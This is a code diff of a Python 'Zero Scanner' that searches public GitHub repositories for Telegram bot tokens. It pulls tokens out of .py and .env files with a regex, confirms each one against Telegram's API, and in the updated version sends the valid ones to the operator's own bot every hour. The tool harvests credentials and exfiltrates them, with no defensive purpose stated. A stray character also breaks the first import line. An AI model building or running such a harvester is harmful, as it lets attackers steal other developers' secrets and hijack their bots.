@@ -1,58 +1,52 @@
-import os
-import asyncio
+كimport asyncio
+import re
 import aiohttp
 from github import Github
+import os
 
-# إعدادات الاتصال
 GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
 g = Github(GITHUB_TOKEN)
+scanned_repos = set()
 
 async def validate_token(session, token):
-    """التحقق من صحة التوكن عبر API تيليجرام"""
     url = f"https://api.telegram.org/bot{token}/getMe"
     try:
         async with session.get(url, timeout=5) as resp:
             if resp.status == 200:
                 return await resp.json()
     except Exception:
-        return None
+        pass
     return None
 
-async def scanner_logic():
-    print("Zero Scanner: بدأت عملية البحث عن المستودعات ذات الجودة العالية...")
-    
-    # البحث عن مستودعات ذات نجوم عالية (أكبر من 50 نجمة) لضمان النشاط
-    repositories = g.search_repositories(query="telegram bot token", sort="stars", order="desc")
-    
-    async with aiohttp.ClientSession() as session:
-        for repo in repositories[:20]:  # فحص أفضل 20 مستودع في البحث
-            if repo.stargazers_count < 50:
-                continue
+async def run_scanner(bot_interface):
+    """عملية الفحص الدورية"""
+    print("[SYSTEM] Scanner Engine: Started.")
+    while True:
+        try:
+            # البحث عن مستودعات نشطة
+            repos = g.search_repositories(query="telegram bot token", sort="updated")[:20]
             
-            print(f"جاري فحص: {repo.full_name} | النجوم: {repo.stargazers_count}")
-            
-            try:
-                # البحث عن ملفات تحتوي على احتمالية وجود توكن
-                contents = repo.get_contents("")
-                for content in contents:
-                    if content.type == "file" and content.name.endswith(('.py', '.env', '.yml')):
-                        file_content = content.decoded_content.decode('utf-8')
+            async with aiohttp.ClientSession() as session:
+                for repo in repos:
+                    if repo.full_name in scanned_repos or repo.stargazers_count < 50:
+                        continue
                         
-                        # منطق بسيط لاستخراج التوكن (يمكنك تحسينه بالـ Regex)
-                        # ابحث عن الأنماط التي تشبه توكنات تيليجرام
-                        import re
-                        tokens = re.findall(r'\d{8,10}:[a-zA-Z0-9_-]{35}', file_content)
-                        
-                        for token in tokens:
-                            result = await validate_token(session, token)
-                            if result:
-                                print(f"✅ توكن صالح وجديد: {token}")
-                                # هنا يمكنك إضافة كود إرسال النتيجة لبوت التيليجرام الخاص بك
-            except Exception as e:
-                continue
+                    print(f"[SYSTEM] Scanning: {repo.full_name}")
+                    scanned_repos.add(repo.full_name)
+                    
+                    try:
+                        contents = repo.get_contents("")
+                        for content in contents:
+                            if content.type == "file" and content.name.endswith(('.py', '.env')):
+                                text = content.decoded_content.decode('utf-8')
+                                tokens = re.findall(r'\d{8,10}:[a-zA-Z0-9_-]{35}', text)
+                                for token in tokens:
+                                    valid = await validate_token(session, token)
+                                    if valid:
+                                        await bot_interface.send_message(f"🚨 New Token Found: `{token}`")
+                    except Exception:
+                        continue
+        except Exception as e:
+            print(f"[ERROR] Scanner loop: {e}")
             
-            # تأخير بسيط لتجنب حظر الـ API
-            await asyncio.sleep(2)
-
-if __name__ == "__main__":
-    asyncio.run(scanner_logic())
+        await asyncio.sleep(3600) # فحص كل ساعة
